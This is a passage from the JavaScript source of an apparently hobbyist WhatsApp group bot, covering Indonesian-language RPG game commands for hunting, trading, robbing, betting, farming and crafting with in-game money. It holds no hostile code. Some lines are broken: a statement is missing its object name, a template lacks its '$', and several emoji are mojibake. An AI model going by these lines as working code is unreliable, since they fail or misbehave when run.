⮕ ᴛᴏ ᴠɪᴇᴡ ᴅɪғғᴇʀᴇɴᴛ ʟᴇᴀᴅᴇʀʙᴏᴀʀᴅ:
${command} [type]
★ ᴇxᴀᴍᴩʟᴇ:
${command} legendary`.trim()
if (!leaderboard.includes(type))
return await qioreply('*––––『 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳 』––––*\n' + wrong, {
contextInfo: {

}
})
let page = isNumber(args[1]) ? Math.min(Math.max(parseInt(args[1]), 0), getPage(type)): 0
let sortedItem = users.map(toNumber(type)).sort(sort(type))
let userItem = sortedItem.map(enumGetKey)
// let len = args[0] && args[0].length > 0 ? Math.min(100, Math.max(parseInt(args[0]), 5)) : Math.min(5, sortedExp.length)
let text = `
🏆 ʀᴀɴᴋ: ${userItem.indexOf(m.sender) + 1} ᴏᴜᴛ ᴏғ ${userItem.length}

*• ${rpg.emoticon(type)} ${type} •*

${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: qio.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
return await qioreply(text,{
contextInfo: {
mentionedJid: [...userItem.slice(page * 0, page * 5 + 5)].filter(v => !participants.some(p => areJidsSameUser(v, p.id))),
 
}
})
}
break
//=================================================//
case 'mulung': {
if (!isGroup) return qioreply(mess.ingroup)
function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}
let user = db.data.users[m.sender]
let time = user.lastmulung + 1800000

if (new Date - user.lastmulung < 1800000) return m.reply(`Anda sudah lelah untuk mulung\nTunggu selama ${msToTime(time - new Date())} lagi`)

let botol = Math.floor(Math.random() * 1000)
let kaleng = Math.floor(Math.random() * 1000)
let kardus = Math.floor(Math.random() * 1000)
let gelas = Math.floor(Math.random() * 1000)
let plastik = Math.floor(Math.random() * 1000)

user.botol += botol * 1
user.kaleng += kaleng * 1
user.kardus += kardus * 1
user.gelas += gelas * 1
user.plastik += plastik * 1
user.lastmulung = new Date * 1

m.reply(`Selamat kamu mendapatkan : \n+${botol} Botol\n+${kaleng} Kaleng\n+${kardus} Kardus\n+${gelas} Gelas\n+${plastik} Plastik`)
}
break
//=================================================//
case 'berburu': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let timers = clockString(_timers) 
let name = qio.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Berburu'
qio.misi = qio.misi ? qio.misi : {}
if (id in qio.misi) {
return qioreply( `Selesaikan Misi ${qio.misi[id][0]} Terlebih Dahulu`)
 }
if (new Date - user.lastmisi > 3600000) {
let hewan1 = Math.floor(Math.random() * 10)
let hewan2 = Math.floor(Math.random() * 10)
let hewan3 = Math.floor(Math.random() * 10)
let hewan4 = Math.floor(Math.random() * 10)
let hewan5 = Math.floor(Math.random() * 10)
let hewan6 = Math.floor(Math.random() * 10)
let hewan7 = Math.floor(Math.random() * 10)
let hewan8 = Math.floor(Math.random() * 10)
let hewan9 = Math.floor(Math.random() * 10)
let hewan10 = Math.floor(Math.random() * 10)
let hewan11 = Math.floor(Math.random() * 10)
let hewan12 = Math.floor(Math.random() * 10)

let hsl = `🕸 *Hasil Berburu ${user.registered ? user.name : qio.getName(m.sender)}* 
${hewan1 ? `
🐂 Banteng: ${hewan1}` : ''} ${hewan2 ? `
🐅 Harimau: ${hewan2}` : ''} ${hewan3 ? `
🐘 Gajah: ${hewan3}` : ''} ${hewan4 ? `
🐐 Kambing: ${hewan4}` : ''} ${hewan5 ? `
🐼 Panda: ${hewan5}` : ''} ${hewan6 ? `
🐊 Buaya: ${hewan6}` : ''} ${hewan7 ? `
🐃 Kerbau: ${hewan7}` : ''} ${hewan8 ? `
🐮 Sapi: ${hewan8}` : ''} ${hewan9 ? `
🐒 Monyet: ${hewan9}` : ''} ${hewan10 ? `
🐗 Babi Hutan: ${hewan10}` : ''} ${hewan11 ? `
🐖 Babi: ${hewan11}` : ''} ${hewan12 ? `
🐓 Ayam: ${hewan12}` : ''}
`.trim()

user.banteng += hewan1
user.harimau += hewan2
user.gajah += hewan3
user.kambing += hewan4
user.panda += hewan5
user.buaya += hewan6
user.kerbau += hewan7
user.sapi += hewan8
user.monyet += hewan9
user.babihutan += hewan10
user.babi += hewan11
user.ayam += hewan12

qio.misi[id] = [
kerja,
setTimeout(() => {
delete qio.misi[id]
}, 20000)
]

setTimeout(() => {
m.reply(`${hsl}`)
}, 20000)

setTimeout(() => {
m.reply(`Nah ini dia`)
}, 18000)

setTimeout(() => {
qioreply('Dorr🔥')
}, 15000)

setTimeout(() => {
qioreply('Dapat Sasaran')
}, 14000)

setTimeout(() => {
qioreply('Sedang mencari mangsa...')
}, 0)
user.lastmisi = new Date * 1
} else m.reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=================================================//
case 'polisi': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let order = db.data.users[m.sender].ojekk
let timers = clockString(_timers)
let name = qio.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Polisi'
qio.misi = qio.misi ? qio.misi: {}
if (id in qio.misi) {
m.reply(`Selesaikan Misi ${qio.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let randomaku1 = Math.floor(Math.random() * 10)
let randomaku2 = Math.floor(Math.random() * 10)

let rbrb1 = (randomaku1 * 100000)
let rbrb2 = (randomaku2 * 1000)

var dimas = `
👮Mengejar Pencuri....
`.trim()

var dimas2 = `
👮Menangkap pencuri....
`.trim()

var dimas3 = `
🚔Membawa ke kantor polisi\nDan di penjara
`.trim()

var dimas4 = `
➕ 💹Menerima gaji....
`.trim()

var hsl = `
*—[ Hasil Polisi ${name} ]—*
➕ 💹 Uang = [ ${rbrb1} ]
➕ ✨ Exp = [ ${rbrb2} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

user.money += rbrb1
user.exp += rbrb2
user.ojekk += 1

qio.misi[id] = [
kerja,
setTimeout(() => {
delete qio.misi[id]
}, 27000)
]

setTimeout(() => {
m.reply(`${hsl}`)
}, 27000)

setTimeout(() => {
m.reply(`${dimas4}`)
}, 25000)

setTimeout(() => {
m.reply(`${dimas3}`)
}, 20000)

setTimeout(() => {
 m.reply(`${dimas2}`)
}, 15000)

setTimeout(() => {
m.reply(`${dimas}`)
}, 10000)

setTimeout(() => {
qioreply('??Sedang Berpatroli.....')
}, 0)
user.lastmisi = new Date * 1
} else m.reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break

// let pajak = 0.02
case 'berdagang': {
if (!isGroup) return qioreply(mess.ingroup)
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}

let dapat = (Math.floor(Math.random() * 5000))
let who
if (isGroup) who = m.mentionedJid[0]
else who = m.chat
if (!who) return qioreply ('Tag salah satu lah, yang kamu ingin berdagang bareng')
if (typeof db.data.users[who] == 'undefined') return qioreply('Pengguna tidak ada didalam data base')
let __timers = (new Date - db.data.users[m.sender].lastdagang)
let _timers = (28800000 - __timers)
let timers = clockString(_timers)
let users = db.data.users
let username = qio.getName(who)
if (new Date - db.data.users[m.sender].lastdagang > 28800000) {
if (4999 > users[who].money) return qioreply ('Target tidak memiliki modal harap masukkan modal 5000')
if (4999 > users[m.sender].money) return qioreply ('kamu tidak memiliki modal harap masukkan modal 5000')
users[who].money -= dapat * 1
users[m.sender].money -= dapat * 1
db.data.users[m.sender].lastdagang = new Date * 1
m.reply(`Mohon tunggu kak..\nKamu dan @${who.replace(/@.+/, '')} sedang berdagang.. ðŸ˜…\n\nKamu dan @${who.replace(/@.+/, '')} meletakkan modal -${dapat} ðŸ˜…`)
setTimeout(() => {
qioreply(m.chat, `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, m, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 3600000)
setTimeout(() => {
m.reply(`Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 7200000)
setTimeout(() => {
qioreply( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 10800000)
setTimeout(() => {
qioreply( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 14400000)
setTimeout(() => {
qioreply( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 18000000)
setTimeout(() => {
qioreply( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 21600000)
setTimeout(() => {
qioreply( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 25200000)
setTimeout(() => {
qioreply( `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +10000\n${users[m.sender].money += 10000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +100000\n${users[who].money += 100000} Money @${who.replace(/@.+/, '')}`,{
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 28800000)
} else m.reply(`Anda Sudah Berdagang , tunggu ${timers} lagi..`)

}
break
//=================================================//
case 'merampok':
case 'rampok': {
if (!isGroup) return qioreply(mess.ingroup)
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let dapat = (Math.floor(Math.random() * 100000))
let users = db.data.users
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : (m.quoted && m.quoted.sender);
if (!who) return qioreply('Tag orang yang mau kamu Rampok!');
if (users[who].level > users[m.sender].level) return m.reply(`Level kamu harus lebih tinggi dari @${who.split('@')[0]} Untuk bisa merampoknya!`, false, { mentions: [who] })
let __timers = (new Date - db.data.users[m.sender].lastrampok)
let _timers = (3600000 - __timers)
let timers = clockString(_timers)
if (new Date - db.data.users[m.sender].lastrampok > 3600000) {
if (10000 > users[who].money) return qioreply('ᴛᴀʀɢᴇᴛ ɢᴀᴀᴅᴀ 💰ᴜᴀɴɢ ʙᴏᴅᴏʜ, ᴋɪꜱᴍɪɴ ᴅɪᴀ')
users[who].money -= dapat * 1
users[m.sender].money += dapat * 1
db.data.users[m.sender].lastrampok = new Date * 1
qioreply( `ʙᴇʀʜᴀꜱɪʟ ᴍᴇʀᴀᴍᴘᴏᴋ ᴍᴏɴᴇʏ ᴛᴀʀɢᴇᴛ ꜱᴇʙᴇꜱᴀʀ 💰${dapat}`)
} else qioreply( `Anda Sudah merampok dan berhasil sembunyi , tunggu ${timers} untuk merampok lagi`)
}
break
//=================================================//
case 'banknabung': {
if (!isGroup) return qioreply(mess.ingroup)
if (!q) return m.reply(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditabung*_

- _*${prefix}${command} jumlah*_
- _*${prefix}${command} all*_

\`${prefix}${command} 10000\``)
const xpperlimit = 1
let user = db.data.users[m.sender]
count = q.toLowerCase() === 'all' ? user.money : parseInt(q)
count = Math.min(user.money, count)
if (count <= 0) return qioreply('Kamu tidak memiliki cukup uang untuk menabung.')
if (user.atm == 0) return qioreply('kamu belum mempunyai kartu ATM')
if (user.bank > user.fullatm) return qioreply('Uang Di ATM sudah penuh!')
if (count > user.fullatm - user.bank) return qioreply('Uangnya nya sudah mencapai batas')
if (user.money >= xpperlimit * count) {
user.money -= xpperlimit * count
user.bank += count
m.reply(`Sukses menabung sebesar ${count} Money 💹`)
} else {
return
}
}
break
//=================================================//
case 'banktarik': {
if (!isGroup) return qioreply(mess.ingroup)
if (!q) return m.reply(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditarik*_

- _*${prefix}${command} jumlah*_
- _*${prefix}${command} all*_

\`${prefix}${command} 10000\``);
const xpperlimit = 1
let user = db.data.users[m.sender]
count = q.toLowerCase() === 'all' ? user.bank : parseInt(q)
count = Math.min(user.bank, count)
if (count <= 0) return qioreply('Kamu tidak memiliki cukup uang untuk menabung.')
if (user.atm == 0) return qioreply('kamu belum mempuyai kartu ATM !')
if (user.bank >= xpperlimit * count) {
user.bank -= xpperlimit * count
user.money += count
m.reply(`Sukses menarik sebesar ${count} Money 💹`)
} else {
return
}
}
break
//=================================================//
case 'berkebon':{
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
const timeout = 1800000
let __timers = (new Date - db.data.users[m.sender].lastberkebon)
let _timers = (timeout - __timers)
let timers = clockString(_timers)
let user = db.data.users[m.sender]
let { stock } = db.data.settings[botNumber]
let pisang = 100 - user.bibitpisang
let anggur = 100 - user.bibitanggur
let mangga = 100 - user.bibitmangga
let jeruk = 100 - user.bibitjeruk
let apel = 100 - user.bibitapel
let kerja = 'Berkebun'
let id = m.chat
.misi = qio.misi ? qio.misi : {}
if (id in qio.misi) {
m.reply(`Selesaikan Misi ${qio.misi[id][0]} Terlebih Dahulu`)
return false
}
let caption = `
📮 Kamu Membutuhkan Bibit:\n${user.bibitpisang < 100 ? `\n${global.rpg.emoticon('bibitpisang')} BibitPisang: ${pisang}`: ''} ${user.bibitanggur < 100 ? `\n${global.rpg.emoticon('bibitanggur')} BibitAnggur: ${anggur}`: ''} ${user.bibitmangga < 100 ? `\n${global.rpg.emoticon('bibitmangga')} BibitMangga: ${mangga}`: ''} ${user.bibitjeruk < 100 ? `\n${global.rpg.emoticon('bibitjeruk')} BibitJeruk: ${jeruk}`: ''} ${user.bibitapel < 100 ? `\n${global.rpg.emoticon('bibitapel')} BibitApel: ${apel}`: ''}`.trim()
if (new Date - user.lastberkebon > 1800000) {
if (user.bibitpisang >= 100 && user.bibitanggur >= 100 && user.bibitmangga >= 100 && user.bibitapel >= 100 && user.bibitjeruk >= 100) {
let hasil1 = Math.floor(Math.random() * 100)
let hasil2 = Math.floor(Math.random() * 100)
let hasil3 = Math.floor(Math.random() * 100)
let hasil4 = Math.floor(Math.random() * 100)
let hasil5 = Math.floor(Math.random() * 100)

let caption = `⌛ Hasil Panen Kamu

${global.rpg.emoticon('pisang')} Pisang: ${hasil1}
${global.rpg.emoticon('anggur')} Anggur ${hasil2}
${global.rpg.emoticon('mangga')} Mangga: ${hasil3}
${global.rpg.emoticon('jeruk')} Jeruk: ${hasil4}
${global.rpg.emoticon('apel')} Apel: ${hasil5}
`
user.pisang += hasil1
user.anggur += hasil2
user.mangga += hasil3
user.jeruk += hasil4
user.apel += hasil5

user.bibitpisang -= 100
user.bibitanggur -= 100
user.bibitmangga -= 100
user.bibitjeruk -= 100
user.bibitapel -= 100

stock.bibitpisang += 100
stock.bibitanggur += 100
stock.bibitmangga += 100
stock.bibitjeruk += 100
stock.bibitapel += 100


qio.misi[id] = [
kerja,
setTimeout(() => {
delete qio.misi[id]
}, 20000)
]

setTimeout(() => {
m.reply(`${caption.trim()}`)
}, 20000)

setTimeout(() => {
qioreply('Sedang Menanam Bibit...')
}, 0)
user.lastberkebon = new Date * 1
} else m.reply(`${caption}`)
} else m.reply(`Mohon Menunggu Selama ${timers} Untuk Berkebun Kembali...`)
}
break
//=================================================//
case 'bet': {
if (!isGroup) return qioreply(mess.ingroup)
function number(x = 0) {
x = parseInt(x)
return !isNaN(x) && typeof x == 'number'
}
const items = [ 'money', 'chip' ]
let user = db.data.users[m.sender]
let item = items.filter(v => v in user && typeof user[v] == 'number')
let type = (args[0] || '').toLowerCase()
let count = (args[1] && number(parseInt(args[1])) ? Math.max(parseInt(args[1]), 1): /all/i.test(args[1]) ? Math.floor(parseInt(user[type])): 1) * 1
if (!item.includes(type)) return m.reply(`*LIST Item:*\n${item.map(v => `${global.rpg.emoticon(v)}${v}`.trim()).join('\n')}\n\nExample:\nbet money 100000`)
if ((user[type] * 1) < count) return m.reply(`*${type} ${global.rpg.emoticon(type)}* kamu tidak cukup!!`)
let moneyDulu = user[type] * 1
let txt = (m.msg && m.msg.selectedDisplayText ? m.msg.selectedDisplayText: m.text ? m.text: '').toLowerCase()
try {
let Bot = (Math.ceil(Math.random() * 91)) * 1
let Kamu = (Math.floor(Math.random() * 71)) * 1
let status = 'Kalah'
if (Bot < Kamu) {
user[type] += count * 1
status = 'Menang'
} else if (Bot > Kamu) {
user[type] -= count * 1
} else {
status = 'Seri'
user[type] += (Math.floor(count / 1.5)) * 1
}
m.reply(`
| *PLAYERS* | *POINT* |
*🤖 BOT:* {Bot}
*👤 KAMU:* ${Kamu}

Kamu *${status}*, kamu ${status == 'Menang' ? `Mendapatkan *+${count * 2}*`: status == 'Kalah' ? `Kehilangan *-${count * 1}*`: `Mendapatkan *+${Math.floor(count / 1.5)}*`} *${type} ${global.rpg.emoticon(type)}*
`.trim())
} catch (e) {
if (moneyDulu > (user[type] * 1)) user[type] = moneyDulu * 1
qioreply('Error saat melakukan judi (Rejected)')
}
}
break
//=================================================//
case 'claim':
case 'bonus': {
if (!isGroup) return qioreply(mess.ingroup)
function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds

return hours + " jam " + minutes + " menit " + seconds + " detik"
}
let user = db.data.users[m.sender]
let time = user.lastbonus + 86400000
if (new Date - user.lastbonus < 86400000) return m.reply(`Kamu Sudah Ambil Bonus Hari Ini\nTunggu selama ${msToTime(time - new Date())} lagi`)
let money = Math.floor(Math.random() * 50000000)
user.money += money * 1
user.lastbonus = new Date * 1
m.reply(`Selamat Kamu Mendapatkan Bonus : \n+${money} Money`)
}
break
//=================================================//
case 'buah': {
if (!isGroup) return qioreply(mess.ingroup)
let user = db.data.users[m.sender]
let ini_txt = `[ *GUDANG BUAH KAMU* ]\n\n`
ini_txt += `🍌 ${user.pisang} Pisang\n`
ini_txt += `🍇 ${user.anggur} Anggur\n`
ini_txt += `🥭 ${user.mangga} Mangga\n`
ini_txt += `🍊 ${user.jeruk} Jeruk\n`
ini_txt += `🍎 ${user.apel} Apel\n\n`
ini_txt += `Gunakan command *buah sell* untuk menjual.`
m.reply(`${ini_txt}`)
}
break
//=================================================//
case 'bunuh':
case 'hitman': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let order = db.data.users[m.sender].ojekk
let timers = clockString(_timers)
let name = qio.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Bunuh'
qio.misi = qio.misi ? qio.misi : {}
if (id in qio.misi) {
m.reply(`Selesaikan Misi ${qio.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let randomaku4 = Math.floor(Math.random() * 10)
let randomaku5 = Math.floor(Math.random() * 10)

let rbrb4 = (randomaku4 * 100000)
let rbrb5 = (randomaku5 * 1000)

var dimas = `
🕵️ Mendapatkan Target.....
`.trim()

var dimas2 = `
⚔️ Menusuk Tubuhnya.....
`.trim()

var dimas3 = `
☠️ Target meninggal\nDan kamu mengambil barang² nya
`.trim()

var dimas4 = `
💼 Hasil dari membunuh....
`.trim()

var hsl = `
*—[ Hasil ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 👮 Pelanggaran +1
➕ ☑️ Misi Berhasil = +1
➕ 📥Total Misi Sebelumnya : ${order}
`.trim()

user.money += rbrb4
user.exp += rbrb5
user.ojekk += 1
user.warn += 1

qio.misi[id] = [
kerja,
setTimeout(() => {
delete qio.misi[id]
}, 27000)
]
setTimeout(() => {
m.reply(`${hsl}`)
}, 27000)

setTimeout(() => {
m.reply(`${dimas4}`)
}, 25000)

setTimeout(() => {
m.reply(`${dimas3}`)
}, 20000)

setTimeout(() => {
m.reply(`${dimas2}`)
}, 15000)

setTimeout(() => {
m.reply(`${dimas}`)
}, 10000)

setTimeout(() => {
qioreply('🔍Mencari Target pembunuhan.....')
}, 0)
user.lastmisi = new Date * 1
} else m.reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=================================================//
case 'collect': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
console.log({ms,h,m,s})
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastclaim)
let _timers = (43200000 - __timers)
let timers = clockString(_timers) 
let user = db.data.users[m.sender]
if (new Date - db.data.users[m.sender].lastclaim > 43200000) {
m.reply(`Kamu sudah mengclaim dan mendapatkan *1000* 💵money dan *1* 🥤potion`)
user.money += 1000
user.potion += 1
user.lastclaim = new Date * 1
} else m.reply(`silahkan tunggu *${timers}* lagi untuk bisa mengclaim lagi`)
}
break
//=================================================//
case 'craft':
case 'crafting': {
if (!isGroup) return qioreply(mess.ingroup)
let type = (args[0] || '').toLowerCase()
let _type = (args[0] || '').toLowerCase()
let user = db.data.users[m.sender]
let { stock } = db.data.settings[botNumber]

let caption = `
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} pickaxe*

*乂 List Yang Bisa Di Craft*
▧ Pickaxe ⛏️
▧ Sword ⚔️
▧ Fishingrod 🎣
▧ Armor 🥼
▧ Atm 💳

*乂 Recipe*
▧ Pickaxe ⛏️
〉 10 Kayu
〉 5 Batu
〉 5 Iron
〉 20 String

▧ Sword ⚔️
〉 10 Kayu
〉 15 Iron

▧ Fishingrod 🎣
〉 10 Kayu
〉 2 Iron
〉 20 String

▧ Armor 🥼
〉 30 Iron
〉 1 Emerald
〉 5 Diamond

▧ Atm 💳
〉3 Emerald
〉6 Diamond
〉10k Money
`
try {
if (/craft|Crafting/i.test(command)) {
const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
switch (type) {
case 'pickaxe':
if (user.pickaxe > 0) return qioreply('Kamu sudah memilik ini')
if(user.rock < 5 || user.wood < 10 || user.iron < 5 || user.string < 20) return m.reply(`Barang tidak cukup!\nUntuk membuat pickaxe. Kamu memerlukan : ${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''} ${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}${user.rock < 5 ? `\n${5 - user.rock} Batu 🪨` : ''}`)
user.wood -= 10
stock.wood += 10

user.iron -= 5
stock.iron += 5

user.rock -= 5
stock.rock += 5

user.string -= 20
stock.string += 20

user.pickaxe += 1
user.pickaxedurability = 40
qioreply("Sukses membuat 1 pickaxe 🔨")
break
//=================================================//
case 'sword':
if (user.sword > 0) return qioreply('Kamu sudah memilik ini')
if(user.wood < 10 || user.iron < 15) return m.reply(`Barang tidak cukup!\nUntuk membuat sword. Kamu memerlukan :${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''}${user.iron < 15 ? `\n${15 - user.iron} iron⛓️` : ''}`)
user.wood -= 10
stock.wood += 10

user.iron -= 15
stock.iron += 15

user.sword += 1
user.sworddurability = 40
qioreply("Sukses membuat 1 sword 🗡️")
break
//=================================================//
case 'fishingrod':
if (user.fishingrod > 0) return qioreply('Kamu sudah memilik ini')
if(user.wood < 20 || user.iron < 5 || user.string < 20) return m.reply(`Barang tidak cukup!\nUntuk membuat pancingan. Kamu memerlukan :${user.wood < 20 ? `\n${20 - user.wood} kayu🪵` : ''}${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}`)
user.wood -= 10
stock.wood += 10

user.iron -= 2
stock.iron +=2

user.string -= 20
stock.string += 20

user.fishingrod += 1
user.fishingroddurability = 40
qioreply("Sukses membuat 1 Pancingan 🎣")
break
//=================================================//
case 'armor':
if (user.armor > 0) return qioreply('Kamu sudah memilik ini')
if(user.iron < 30 || user.emerald < 1 || user.diamond < 5) return m.reply(`Barang tidak cukup!\nUntuk membuat armor. Kamu memerlukan :${user.iron < 30 ? `\n${30 - user.iron} Iron ⛓️` : ''}${user.emerald < 1 ? `\n${1 - user.emerald} Emerald ❇️` : ''}${user.diamond < 5 ? `\n${5 - user.diamond} Diamond 💎` : ''}`)
user.emerald -= 1
stock.emerald += 1

user.iron -= 30
stock.iron += 30

user.diamond -= 5
stock.diamond += 5

user.armor += 1
user.armordurability = 50
qioreply("Sukses membuat 1 Armor 🥼")
break
//=================================================//
case 'atm':
if (user.atm > 0) return qioreply('Kamu sudah memilik ini')
if(user.emerald < 3 || user.money < 10000 || user.diamond < 6) return m.reply(`Barang tidak cukup!\nUntuk membuat atm. Kamu memerlukan :${user.money < 10000 ? `\n${10000 - user.money} Money 💹` : ''}${user.emerald < 3 ? `\n${3 - user.emerald} Emerald ❇️` : ''}${user.diamond < 6 ? `\n${6 - user.diamond} Diamond 💎` : ''}`)
user.emerald -= 3
stock.emerald += 3

user.diamond -= 6
stock.diamond += 6

user.money -= 10000
user.atm += 1
user.fullatm = 500000000
qioreply("Sukses membuat 1 Atm 💳")
break
default:
return await m.reply(`${caption}`)
}
} 
} catch (err) {
qioreply("Error\n\n\n" + err.stack)
}
}
break
//=================================================//
case 'feed': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = isNaN(ms) ? '--' : Math.floor(ms / 310000)
